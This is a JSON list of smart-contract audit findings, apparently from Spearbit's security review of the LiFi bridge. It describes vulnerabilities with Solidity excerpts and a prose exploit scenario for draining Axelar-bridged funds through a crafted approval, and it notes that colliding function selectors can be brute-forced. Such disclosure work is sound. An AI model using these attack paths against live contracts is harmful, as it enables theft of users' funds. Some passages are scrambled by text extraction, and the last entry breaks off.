[{"title": "LiFi protocol isnt hardened", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The usage of the LiFi protocol depends largely on off chain APIs. It takes all values, fees, limits, chain ids and addresses to be called from the APIs and doesnt verify them. Several elements are not connected via smart contracts but via the API, for example:  the emits of LiFiTransferStarted versus the bridge transactions.  the fees paid to the FeeCollector versus the bridge transactions.  the Periphery contracts as defined in the PeripheryRegistryFacet versus the rest. In case the API and or frontend contain errors or are hacked then tokens could be easily lost. Also, when calling the LiFi contracts directly or via other smart contracts, it is rather trivial to commit mistakes and loose tokens. Emit data can be easily disturbed by malicious actors, making it unusable. The payment of fees can be easily circumvented by accessing the contracts directly. It is easy to make fake websites which trick users into signing transactions which seem to be for LiFi but result in loosing tokens. With the current design, the power of smart contracts isnt used and it introduces numerous risks as described in the rest of this report.", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "Bridge with Axelar can be stolen with malicious external call", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Executor contract allows users to build an arbitrary payload external call to any address except address(erc20Proxy). erc20Proxy is not the only dangerous address to call. By building a malicious external call to Axelar gateway, exploiters can steal users funds. The Executor does swaps at the destination chain. By setting the receiver address to the Executor contract at the destination chain, Li-Fi can help users to get the best price. Executor inherits IAxelarExecutable. execute and executeWithToken validates the payload and executes the external call. IAxelarExecutable.sol#L27-L40 function executeWithToken( bytes32 commandId, string calldata sourceChain, string calldata sourceAddress, bytes calldata payload, string calldata tokenSymbol, uint256 amount ) external { bytes32 payloadHash = keccak256(payload); if (!gateway.validateContractCallAndMint(commandId, sourceChain, sourceAddress, payloadHash, ,! tokenSymbol, amount)) revert NotApprovedByGateway(); _executeWithToken(sourceChain, sourceAddress, payload, tokenSymbol, amount); } The nuance lies in the Axelar gateway AxelarGateway.sol#L133-L148. Once the receiver calls validateContract- CallAndMint with a valid payload, the gateway mints the tokens to the receiver and marks it as executed. It is the receiver contracts responsibility to execute the external call. Exploiters can build a malicious external call to trigger validateContractCallAndMint, the Axelar gateway would mint the tokens to the Executor contract. The exploiter can then pull the tokens from the Executor contract. The possible exploit scenario 1. Exploiter build a malicious external call. token.approve(address(exploiter), type(uint256).max) 2. A victim user uses the AxelarFacet to bridge tokens. Since the destination bridge has the best price, the users set the receiver to address(Executor) and finish the swap with this.swapAndCompleteBridgeTokens 3. Exploiter observes the victims bridge tx and way.validateContractCallAndMint. exploiter can pull the minted token from the executor contract since theres max allowance. The executor the minted token. builds an contract gets external call to trigger gate- The 4. The victim calls Executor.execute() with the valid payload. However, since the payload has been triggered by the exploiter, its no longer valid. 12", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "LibSwap may pull tokens that are different from the specified asset", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "LibSwap.swap is responsible for doing swaps. Its designed to swap one asset at a time. The _- swapData.callData is provided by user and the LiFi protocol only checks its signature. As a result, users can build a calldata to swap a different asset as specified. For example, the users can set fromAssetId = dai provided addLiquidity(usdc, dai, ...) as call data. The uniswap router would pull usdc and dai at the same time. If there were remaining tokens left in the LiFi protocol, users can sweep tokens from the protocol. library LibSwap { function swap(bytes32 transactionId, SwapData calldata _swapData) internal { ... if (!LibAsset.isNativeAsset(fromAssetId)) { LibAsset.maxApproveERC20(IERC20(fromAssetId), _swapData.approveTo, fromAmount); if (toDeposit != 0) { LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), toDeposit); } } else { nativeValue = fromAmount; } // solhint-disable-next-line avoid-low-level-calls (bool success, bytes memory res) = _swapData.callTo.call{ value: nativeValue ,! }(_swapData.callData); if (!success) { string memory reason = LibUtil.getRevertMsg(res); revert(reason); } }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Check slippage of swaps", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Several bridges check that the output of swaps isnt 0. However it could also happen that swap give a positive output, but still lower than expected due to slippage / sandwiching / MEV. Several AMMs will have a mechanism to limit slippage, but it might be useful to add a generic mechanism as multiple swaps in sequence might have a relative large slippage. function swapAndStartBridgeTokensViaOmniBridge(...) ... { ... uint256 amount = _executeAndCheckSwaps(_lifiData, _swapData, payable(msg.sender)); if (amount == 0) { revert InvalidAmount(); } _startBridge(_lifiData, _bridgeData, amount, true); }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Replace createRetryableTicketNoRefundAliasRewrite() with depositEth()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function _startBridge() of the ArbitrumBridgeFacet uses createRetryableTicketNoRefun- dAliasRewrite(). According to the docs: address-aliasing, this method skips some address rewrite magic that depositEth() does. Normally depositEth() should be used, according to the docs depositing-and-withdrawing-ether. Also this method will be deprecated after nitro: Inbox.sol#L283-L297. While the bridge doesnt do these checks of depositEth(), it is easy for developers, that call the LiFi contracts directly, to make mistakes and loose tokens. function _startBridge(...) ... { ... if (LibAsset.isNativeAsset(_bridgeData.assetId)) { gatewayRouter.createRetryableTicketNoRefundAliasRewrite{ value: _amount + cost }(...); } ... ... }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Hardcode or whitelist the Axelar destinationAddress", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The functions executeCallViaAxelar() and executeCallWithTokenViaAxelar() call a destina- tionAddress on the destinationChain. This destinationAddress needs to have specific Axelar functions (_ex- ecute() and _executeWithTokento() ) be able to receive the calls. This is implemented in the Executor. If these functions dont exist at the destinationAddress, the transferred tokens will be lost. /// @param destinationAddress the address of the LiFi contract on the destinationChain function executeCallViaAxelar(..., string memory destinationAddress, ...) ... { ... s.gateway.callContract(destinationChain, destinationAddress, payload); } Note: the comment \"the address of the LiFi contract\" isnt clear, it could either be the LiFi Diamond or the Execu- tor.", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "WormholeFacet doesnt send native token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The functions of WormholeFacet allow sending the native token, however they dont actually send it across the bridge, causing the native token to stay stuck in the LiFi Diamond and get lost for the sender. contract WormholeFacet is ILiFi, ReentrancyGuard, Swapper { function startBridgeTokensViaWormhole(... ) ... payable ... { // is payable LibAsset.depositAsset(_wormholeData.token, _wormholeData.amount); // allows native token _startBridge(_wormholeData); ... } function _startBridge(WormholeData memory _wormholeData) private { ... LibAsset.maxApproveERC20(...); // geared towards ERC20, also works when `msg.value` is set // no { value : .... } IWormholeRouter(_wormholeData.wormholeRouter).transferTokens(...); } }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "ArbitrumBridgeFacet does not check if msg.value is enough to cover the cost", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The ArbitrumBridgeFacet does not check whether the users provided ether (msg.value) is enough to cover _amount + cost. If there are remaining ethers in LiFis LibDiamond address, exploiters can set a large cost and sweep the ether. function _startBridge( ... ) private { ... uint256 cost = _bridgeData.maxSubmissionCost + _bridgeData.maxGas * _bridgeData.maxGasPrice; if (LibAsset.isNativeAsset(_bridgeData.assetId)) { gatewayRouter.createRetryableTicketNoRefundAliasRewrite{ value: _amount + cost }( ... ); } else { gatewayRouter.outboundTransfer{ value: cost }( ... ); }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Underpaying Optimism l2gas may lead to loss of funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The OptimismBridgeFacet uses Optimisms bridge with user-provided l2gas. function _startBridge( LiFiData calldata _lifiData, BridgeData calldata _bridgeData, uint256 _amount, bool _hasSourceSwap ) private { ... if (LibAsset.isNativeAsset(_bridgeData.assetId)) { bridge.depositETHTo{ value: _amount }(_bridgeData.receiver, _bridgeData.l2Gas, \"\"); } else { ... bridge.depositERC20To( _bridgeData.assetId, _bridgeData.assetIdOnL2, _bridgeData.receiver, _amount, _bridgeData.l2Gas, \"\" ); } } Optimisms standard token bridge makes the cross-chain deposit by sending a cross-chain message to L2Bridge. L1StandardBridge.sol#L114-L123 17 // Construct calldata for finalizeDeposit call bytes memory message = abi.encodeWithSelector( IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.OVM_ETH, _from, _to, msg.value, _data ); // Send calldata into L2 // slither-disable-next-line reentrancy-events sendCrossDomainMessage(l2TokenBridge, _l2Gas, message); If the l2Gas is underpaid, finalizeDeposit will fail and user funds will be lost.", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Funds can be locked during the recovery stage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The recovery is an address that should receive funds if the execution fails on destination do- main. This ensures that funds are never lost with failed calls. However, in the AmarokFacet It is hardcoded as msg.sender. Several unexpected behaviour can be observed with this implementation.  If the msg.sender is a smart contract, It might not be available on the destination chain.  If the msg.sender is a smart contract and deployed on the other chain, the contract maybe will not have function to withdraw native token. As a result of this implementation, funds can be locked when an execution fails. 18 contract AmarokFacet is ILiFi, SwapperV2, ReentrancyGuard { ... IConnextHandler.XCallArgs memory xcallArgs = IConnextHandler.XCallArgs({ params: IConnextHandler.CallParams({ to: _bridgeData.receiver, callData: _bridgeData.callData, originDomain: _bridgeData.srcChainDomain, destinationDomain: _bridgeData.dstChainDomain, agent: _bridgeData.receiver, recovery: msg.sender, forceSlow: false, receiveLocal: false, callback: address(0), callbackFee: 0, relayerFee: 0, slippageTol: _bridgeData.slippageTol }), transactingAssetId: _bridgeData.assetId, amount: _amount }); ... }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "What if the receiver of Axelar _executeWithToken() doesnt claim all tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function _executeWithToken() approves tokens and then calls callTo. If that contract doesnt retrieve the tokens then the tokens stay within the Executor and are lost. Also see: \"Remaining tokens can be sweeped from the LiFi Diamond or the Executor\" contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _executeWithToken(...) ... { ... // transfer received tokens to the recipient IERC20(tokenAddress).approve(callTo, amount); (bool success, ) = callTo.call(callData); ... } }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Remaining tokens can be sweeped from the LiFi Diamond or the Executor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The initial balance of (native) tokens in both the Lifi Diamond and the Executor contract can be sweeped by all the swap functions in all the bridges, which use the following functions:  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  _executeAndCheckSwaps() of SwapperV2.sol  _executeAndCheckSwaps() of Swapper.sol  swapAndCompleteBridgeTokens() of XChainExecFacet Although these functions ...  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  swapAndCompleteBridgeTokens() of XChainExecFacet have the following code: if (!LibAsset.isNativeAsset(transferredAssetId)) { startingBalance = LibAsset.getOwnBalance(transferredAssetId); // sometimes transfer tokens in } else { startingBalance = LibAsset.getOwnBalance(transferredAssetId) - msg.value; } // do swaps uint256 postSwapBalance = LibAsset.getOwnBalance(transferredAssetId); if (postSwapBalance > startingBalance) { LibAsset.transferAsset(transferredAssetId, receiver, postSwapBalance - startingBalance); } This doesnt protect the initial balance of the first tokens, because it can just be part of a swap to another token. The initial balances of intermediate tokens are not checked or protected. As there normally shouldnt be (native) tokens in the LiFi Diamond or the Executor the risk is limited. Note: set the risk to medium as there are other issues in this report that leave tokens in the contracts Although in practice there is some dust in the LiFi Diamond and the Executor:  0x362fa9d0bca5d19f743db50738345ce2b40ec99f  0x46405a9f361c1b9fc09f2c83714f806ff249dae7", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Wormhole bridge chain IDs are different than EVM chain IDs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "According to documentation, Wormhole uses different chain ids than EVM based chain ids. However, the code is implemented with block.chainid check. LiFi is integrated with third party platforms through API. The API/UI side can implement chain id checks, but direct interaction with the contract can lead to loss of funds. function _startBridge(WormholeData memory _wormholeData) private { if (block.chainid == _wormholeData.toChainId) revert CannotBridgeToSameNetwork(); } From other perspective, the following line limits the recipient address to an EVM address. done to a non EVM chain (e.g. Solana, Terra, Terra classic), then the tokens would be lost. If a bridge would be ... bytes32(uint256(uint160(_wormholeData.recipient))) ... Example transactions below.  Chainid 1 Solana  Chainid 3 Terra Classic On the other hand, the usage of the LiFi protocol depends largely on off chain APIs. It takes all values, fees, limits, chain ids and addresses to be called from the APIs. As previously mentioned, the wormhole destination chain ids are different than standard EVM based chains, the following event can be misinterpreted. ... emit LiFiTransferStarted( _lifiData.transactionId, \"wormhole\", \"\", _lifiData.integrator, _lifiData.referrer, _swapData[0].sendingAssetId, _lifiData.receivingAssetId, _wormholeData.recipient, _swapData[0].fromAmount, _wormholeData.toChainId, // It does not show correct chain id which is expected by LiFi Data Analytics true, false ,! ); ...", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Facets approve arbitrary addresses for ERC20 tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "All the facets pointed above approve an address for an ERC20 token, where both these values are provided by the user: LibAsset.maxApproveERC20(IERC20(token), router, amount); The parameter names change depending on the context. So for any ERC20 token that LifiDiamond contract holds, user can:  call any of the functions in these facets to approve another address for that token.  use the approved address to transfer tokens out of LifiDiamond contract. Note: normally there shouldnt be any tokens in the LiFi Diamond contract so the risk is limited. Note: also see \"Hardcode bridge addresses via immutable\"", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk AcrossFacet.sol#L103, ArbitrumBridge-"]}, {"title": "FeeCollector not well integrated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "There is a contract to pay fees for using the bridge: FeeCollector. This is used by crafting a transaction by the frontend API, which then calls the contract via _executeAndCheckSwaps(). Here is an example of the contract Here is an example of the contract of such a transaction Its whitelisted here This way no fees are paid if a developer is using the LiFi contracts directly. Also it is using a mechanism that isnt suited for this. The _executeAndCheckSwaps() is geared for swaps and has several checks on balances. These (and future) checks could interfere with the fee payments. Also this is a complicated and non transparent approach. The project has suggested to see _executeAndCheckSwaps() as a multicall mechanism.", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "_executeSwaps of Executor.sol doesnt have a whitelist", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function _executeSwaps() of Executor.sol doesnt have a whitelist, whereas _executeSwaps() of SwapperV2.sol does have a whitelist. Calling arbitrary addresses is dangerous. For example, unlimited al- lowances can be set to allow stealing of leftover tokens in the Executor contract. Luckily, there wouldnt normally be allowances set from users to the Executor.sol so the risk is limited. Note: also see \"Too generic calls in GenericBridgeFacet allow stealing of tokens\" contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _executeSwaps(... ) ... { for (uint256 i = 0; i < _swapData.length; i++) { if (_swapData[i].callTo == address(erc20Proxy)) revert UnAuthorized(); // Prevent calling ,! ERC20 Proxy directly LibSwap.SwapData calldata currentSwapData = _swapData[i]; LibSwap.swap(_lifiData.transactionId, currentSwapData); } } contract SwapperV2 is ILiFi { function _executeSwaps(... ) ... { for (uint256 i = 0; i < _swapData.length; i++) { LibSwap.SwapData calldata currentSwapData = _swapData[i]; if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); LibSwap.swap(_lifiData.transactionId, currentSwapData); } } Based on the comments of the LiFi project there is also the use case to call more generic contracts, which do not return any token, e.g., NFT buy, carbon offset. It probably better to create new functionality to do this.", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Processing of end balances", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The contract SwapperV2 has the following construction (twice) to prevent using any already start balance.  it gets a start balance.  does an action.  if the end balance > start balance. then it uses the difference. else (which includes start balance == end balance) it uses the end balance. So if the else clause it reached it uses the end balance and ignores any start balance. If the action hasnt changed the balances then start balance == end balance and this amount is used. When the action has lowered the balances then end balance is also used. This defeats the codes purpose. Note: normally there shouldnt be any tokens in the LiFi Diamond contract so the risk is limited. Note Swapper.sol has similar code. contract SwapperV2 is ILiFi { modifier noLeftovers(LibSwap.SwapData[] calldata _swapData, address payable _receiver) { ... uint256[] memory initialBalances = _fetchBalances(_swapData); ... // all kinds of actions newBalance = LibAsset.getOwnBalance(curAsset); curBalance = newBalance > initialBalances[i] ? newBalance - initialBalances[i] : newBalance; ... } function _executeAndCheckSwaps(...) ... { ... uint256 swapBalance = LibAsset.getOwnBalance(finalTokenId); ... // all kinds of actions uint256 newBalance = LibAsset.getOwnBalance(finalTokenId); swapBalance = newBalance > swapBalance ? newBalance - swapBalance : newBalance; ... }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Processing of initial balances", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The LiFi code bases contains two similar source files: Swapper.sol and SwapperV2.sol. One of the differences is the processing of msg.value for native tokens, see pieces of code below. The implementation of SwapperV2.sol sends previously available native token to the msg.sender. The following is exploit example. Assume that:  the LiFi Diamond contract contains 0.1 ETH.  a call is done with msg.value == 1 ETH.  and _swapData[0].fromAmount ETH, which is the amount to be swapped. Option 1Swapper.sol: initialBalances == 1.1 ETH - 1 ETH == 0.1 ETH. Option 2 SwapperV2.sol: initialBalances == 1.1 ETH. After the swap getOwnBalance()is1.1 - 0.5 == 0.6 ETH. Option 1 Swapper.sol: returns 0.6 - 0.1 = 0.5 ETH. Option 2 SwapperV2.sol: returns 0.6 ETH (so includes the previously present ETH). 0.5 == Note: the implementations of noLeftovers() are also different in Swapper.sol and SwapperV2.sol. Note: this is also related to the issue \"Pulling tokens by LibSwap.swap() is counterintuitive\", because the ERC20 are pulled in via LibSwap.swap(), whereas the msg.value is directly added to the balance. As there normally shouldnt be any token in the LiFi Diamond contract the risk is limited. contract Swapper is ILiFi { function _fetchBalances(...) ... { ... for (uint256 i = 0; i < length; i++) { address asset = _swapData[i].receivingAssetId; uint256 balance = LibAsset.getOwnBalance(asset); if (LibAsset.isNativeAsset(asset)) { balances[i] = balance - msg.value; } else { balances[i] = balance; } } return balances; } } contract SwapperV2 is ILiFi { function _fetchBalances(...) ... { ... for (uint256 i = 0; i < length; i++) { balances[i] = LibAsset.getOwnBalance(_swapData[i].receivingAssetId); } ... } } The following functions do a comparable processing of msg.value for the initial balance:  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  swapAndCompleteBridgeTokens() of XChainExecFacet 25 if (!LibAsset.isNativeAsset(transferredAssetId)) { ... } else { startingBalance = LibAsset.getOwnBalance(transferredAssetId) - msg.value; } However in Executor.sol function swapAndCompleteBridgeTokensViaStargate() isnt optimal for ERC20 tokens because ERC20 tokens are already deposited in the contract before calling this function. function swapAndCompleteBridgeTokensViaStargate(... ) ... { ... if (!LibAsset.isNativeAsset(transferredAssetId)) { startingBalance = LibAsset.getOwnBalance(transferredAssetId); // doesn't correct for initial balance } else { ... } ,! } So assume:  0.1 ETH was in the contract.  1 ETH was added by the bridge.  0.5 ETH is swapped. Then the StartingBalance is calculated to be 0.1 ETH + 1 ETH == 1.1 ETH. So no funds are returned to the receiver as the end balance is 1.1 ETH - 0.5 ETH == 0.6 ETH, is smaller than 1.1 ETH. Whereas this should have been (1.1 ETH - 0.5 ETH) - 0.1 ETH == 0.5 ETH.", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Improve dexAllowlist", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The functions _executeSwaps() of both SwapperV2.sol and Swapper.sol use a whitelist to make sure the right functions in the allowed dexes are called. The checks for approveTo, callTo and signature (callData) are independent. This means that any signature is valid for any dex combined with any approveTo address. This grands more access than necessary. This is important because multiple functions can have the same signature. For example these two functions have the same signature:  gasprice_bit_ether(int128) 26  transferFrom(address,address,uint256) See bytes4_signature=0x23b872dd Note: brute forcing an innocent looking function is straightforward The transferFrom() is especially dangerous because it allows sweeping tokens from other users that have set an allowance for the LiFi Diamond. If someone gets a dex whitelisted, which contains a function with the same signature then this can be abused in the current code. Present in both SwapperV2.sol and Swapper.sol: function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); ... } }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Pulling tokens by LibSwap.swap() is counterintuitive", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function LibSwap.swap() pulls in tokens via transferFromERC20() from msg.sender when needed. When put in a loop, via _executeSwaps(), it can pull in multiple different tokens. It also doesnt detect accidentally sending of native tokens with ERC20 tokens. This approach is counterintuitive and leads to risks. Suppose someone wants to swap 100 USDC to 100 DAI and then 100 DAI to 100 USDT. If the first swap somehow gives back less tokens, for example 90 DAI, then LibSwap.swap() pulls in 10 extra DAI from msg.sender. Note: this requires the msg.sender having given multiple allowances to the LiFi Diamond. Another risk is that an attacker tricks a user to sign a transaction for the LiFi protocol. Within one transaction it can sweep multiple tokens from the user, cleaning out his entire wallet. Note: this requires the msg.sender having given multiple allowances to the LiFi Diamond. In Executor.sol the tokens are already deposited, so the \"pull\" functionality is not needed and can even result in additional issues. In Executor.sol it tries to \"pull\" tokens from \"msg.sender\" itself. In the best case of ERC20 implementations (like OpenZeppeling, Solmate) this has no effect. However some non standard ERC20 imple- mentations might break. 27 contract SwapperV2 is ILiFi { function _executeSwaps(...) ... { ... for (uint256 i = 0; i < _swapData.length; i++) { ... LibSwap.swap(_lifiData.transactionId, currentSwapData); } } } library LibSwap { function swap(...) ... { ... uint256 initialSendingAssetBalance = LibAsset.getOwnBalance(fromAssetId); ... uint256 toDeposit = initialSendingAssetBalance < fromAmount ? fromAmount - ,! initialSendingAssetBalance : 0; ... if (toDeposit != 0) { LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), toDeposit); } } } Use LibAsset.depositAsset() before doing", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Too many bytes are checked to verify the function selector", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function _executeSwaps() slices the callData with 8 bytes. The function selector is only 4 bytes. Also see docs So additional bytes are checked unnecessarily, which is probably unwanted. Present in both SwapperV2.sol and Swapper.sol: function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) // should be 4 ) revert ContractCallNotAllowed(); ... } } Definition of dexFuncSignatureAllowList in LibStorage.sol: struct LibStorage { ... mapping(bytes32 => bool) dexFuncSignatureAllowList; ... // could be bytes4 }", "labels": ["Spearbit", "LIFI", "Severity: Medium Risk"]}, {"title": "Check address(self) isnt accidentally whitelisted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "There are several access control mechanisms. If they somehow would allow address(self) then risks would increase as there are several ways to call arbitrary functions. library LibAccess { function addAccess(bytes4 selector, address executor) internal { ... accStor.execAccess[selector][executor] = true; } } contract AccessManagerFacet { function setCanExecute(...) ... { ) external { ... _canExecute ? LibAccess.addAccess(_selector, _executor) : LibAccess.removeAccess(_selector, ,! _executor); } } contract DexManagerFacet { function addDex(address _dex) external { ... dexAllowlist[_dex] = true; ... } function batchAddDex(address[] calldata _dexs) external { dexAllowlist[_dexs[i]] = true; ... ... } }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Verify anyswap token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The AnyswapFacet supplies _anyswapData.token to different functions of _anyswapData.router. These functions interact with the contract behind _anyswapData.token. If the _anyswapData.token would be malicious then tokens can be stolen. Note, this is relevant if the LiFi contract are called directly without using the API. 30 function _startBridge(...) ... { ... IAnyswapRouter(_anyswapData.router).anySwapOutNative{ value: _anyswapData.amount }( _anyswapData.token,...); ... IAnyswapRouter(_anyswapData.router).anySwapOutUnderlying( _anyswapData.token, ... ); ... IAnyswapRouter(_anyswapData.router).anySwapOut( _anyswapData.token, ...); ... ,! }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "More thorough checks for DAI in swapAndStartBridgeTokensViaXDaiBridge()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function swapAndStartBridgeTokensViaXDaiBridge() checks lifiData.sendingAssetId == DAI, however it doesnt check that the result of the swap is DAI (e.g. _swapData[_swapData.length - 1].re- ceivingAssetId == DAI ). function swapAndStartBridgeTokensViaXDaiBridge(...) ... { ... if (lifiData.sendingAssetId != DAI) { revert InvalidSendingToken(); } gnosisBridgeData.amount = _executeAndCheckSwaps(lifiData, swapData, payable(msg.sender)); ... _startBridge(gnosisBridgeData); // sends DAI }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Funds transferred via Connext may be lost on destination due to incorrect receiver or calldata", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "_startBridge() in AmarokFacet.sol and NXTPFacet.sol sets user-provided receiver and call data for the destination chain.  The receiver is intended to be LifiDiamond contract address on destination chain.  The call data is intended such that the functions completeBridgeTokensVia{Amarok/NXTP}() or swapAnd- CompleteBridgeTokensVia{Amarok/NXTP}() are called. In case of a frontend bug or a user error, these parameters can be malformed which will lead to stuck (and stolen) funds on destination chain. Since the addresses and functions are already known, the contract can instead pass this data to Connext instead of taking it from the user. 31", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Check output of swap is equal to amount bridged", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The result of swap (amount) isnt always checked to be the same as the bridged amount (_bridge- Data.amount). This way tokens could stay in the LiFi Diamond if more tokens are received with a swap than bridged. function swapAndStartBridgeTokensViaPolygonBridge(...) ... { ... uint256 amount = _executeAndCheckSwaps(_lifiData, _swapData, payable(msg.sender)); ... _startBridge(_lifiData, _bridgeData, true); } function _startBridge(..., BridgeData calldata _bridgeData, ...) ... { ... if (LibAsset.isNativeAsset(_bridgeData.assetId)) { rootChainManager.depositEtherFor{ value: _bridgeData.amount }(_bridgeData.receiver); } else { ... LibAsset.maxApproveERC20(IERC20(_bridgeData.assetId), _bridgeData.erc20Predicate, ,! _bridgeData.amount); bytes memory depositData = abi.encode(_bridgeData.amount); rootChainManager.depositFor(_bridgeData.receiver, _bridgeData.assetId, depositData); } ... }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Missing timelock logic on the DiamondCut facets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In LiFi Diamond, any facet address/function selector can be changed by the contract owner. Connext, Diamond should go through a proposal window with a delay of 7 days. In function diamondCut( FacetCut[] calldata _diamondCut, address _init, bytes calldata _calldata ) external override { LibDiamond.enforceIsContractOwner(); LibDiamond.diamondCut(_diamondCut, _init, _calldata); }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Data from emit LiFiTransferStarted() cant be relied on", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Most of the function do an emit like LiFiTransferStarted(). Some of the fields of the emits are (sometimes) verified, but most fields come from the input variable _lifiData. The problem with this is that anyone can do solidity transactions to the LiFi bridge and supply wrong data for the emit. For example: transfer a lot of Doge coins and in the emit say they are transferring wrapped BTC. Then the statistics would say a large amount of volume has been transferred, while in reality it is neglectable. The advantage of using a blockchain is that the data is (seen as) reliable. If the data isnt reliable, it isnt worth the trouble (gas cost) to store it in a blockchain and it could just be stored in an offline database. The result of this is, its not useful to create a subgraph on the emit data (because it is unreliable). This would mean a lot of extra work for subgraph builders to reverse engineer what is going on. Also any kickback fees to in- tegrators or referrers cannot be based on this data because it is unreliable. Also user interfaces & dashboards could display the wrong information. 33 function startBridgeTokensViaOmniBridge(LiFiData calldata _lifiData, ...) ... { ... LibAsset.depositAsset(_bridgeData.assetId, _bridgeData.amount); _startBridge(_lifiData, _bridgeData, _bridgeData.amount, false); } function _startBridge(LiFiData calldata _lifiData, ... 